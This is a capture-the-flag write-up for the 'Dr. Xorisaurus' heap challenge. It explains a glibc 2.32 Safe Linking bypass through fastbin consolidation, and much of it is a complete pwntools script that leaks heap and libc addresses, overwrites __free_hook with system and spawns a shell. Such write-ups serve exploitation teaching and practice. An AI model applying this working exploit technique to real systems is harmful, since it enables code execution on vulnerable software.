---
title: "Dr. Xorisaurus — Fastbin Consolidation & Safe Linking"
ctf: "CUCTF 2020"
category: "pwn"
difficulty: "hard"
points: null
date: "2024-05-22"
lat: 40.71
lng: -74.00
summary: "Abusing malloc_consolidate via large scanf allocations , and perform a Safe Linking fastbin attack."
tags:
  - "heap"
  - "fastbin-consolidation"
  - "safe-linking"
  - "glibc-2.32"
---

## Recon

The challenge is a typical menu-based heap note manager. The protections are high:

- Glibc 2.32: Introduces Safe Linking (XORing `fd` pointers with `address >> 12`).
- Full RELRO / PIE / Canary: Standard modern protections.

The vulnerability lies in the fact that we can trigger `malloc_consolidate` by sending a very large input to `scanf` (which internally calls `malloc` for a large buffer). This allows us to merge freed fastbin chunks into the unsorted/large bins, creating chunk overlaps.

## Exploit

### 1. The Consolidation Setup

We allocate 20 chunks of size `0x80`. We free 19 of them.

- 7 fill the tcache.
- 12 go into the fastbins.
- One is left allocated as a guard chunk to prevent the fastbins from merging with the Top Chunk during consolidation.

By sending a large string (`"1" * 0x500`) to the menu, `scanf` triggers `malloc_consolidate`. 
The 12 fastbin chunks merge into one large chunk and move to the Large Bin.

### 2. Information Leak

We allocate a `0x90` chunk. This is carved out of the large bin chunk. The remainder is placed in the Unsorted Bin, populating it with libc pointers (`main_arena`).

By using `view()` and carefully calculating offsets, we leak both the Heap Base and Libc Base.

### 3. Fastbin Dup via Safe Linking

Since we have a UAF-like state from the consolidation overlap, we perform a fastbin dup. On Glibc 2.32, we must bypass Safe Linking.

When overwriting the `fd` pointer of chunk `0`, we XOR our target (`__free_hook`) with the shifted heap address:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./dr_xorisaurus_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.32.so")

context.binary = exe

def malloc(size,data):
    r.sendlineafter(b"Choice: ",b"1")
    r.sendlineafter(b"need: ",size)
    r.sendlineafter(b"in: \n",data)

def free(idx):
    r.sendlineafter(b"Choice: ",b"3")
    r.sendlineafter(b"drain: ",idx)

def view(idx):
    r.sendlineafter(b"Choice: ",b"2")
    r.sendlineafter(b"glass: ",idx)
    r.recvline()
def once(idx,data):
    r.sendlineafter(b"Choice: ",b"4")
    r.sendlineafter(b"chemicals: ",idx)
    r.sendlineafter(b"Choice: ",b"5")
    r.sendlineafter(b"chemicals: ",data)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    global r
    r = conn()

    for i in range(20):
        malloc(b"80",b"B")

    for i in range(19):
        free(f"{i}".encode())

    r.sendline("1"*0x500)

    malloc(b"90",b"A"*15)
    view(b"0")

    heap = u64(r.recvline().strip().ljust(8,b"\x00"))  #- 0xb0

    malloc(b"111",b"")
    view(b"1")

    lib = u64(b"\x00" + r.recvline().strip().ljust(7,b"\x00")) - 0x1b8c00
    log.success(f"LEAK:\nheap:{hex(heap)}\nlibc:{hex(lib)}\n")
    libc.address = lib


    free(b"0")
    free(b"1")
    malloc(b"80",b"")

    fd = (heap>>12) ^ libc.symbols['__free_hook']
    once(b"0",p64(fd))
  
    malloc(b"90",b"")
    malloc(b"80",b"")
   
    malloc(b"80",p64(libc.symbols['system']))
    malloc(b"90","/bin/sh\x00")
   
    free(b"4")

    r.interactive()

if __name__ == "__main__":
    main()
```

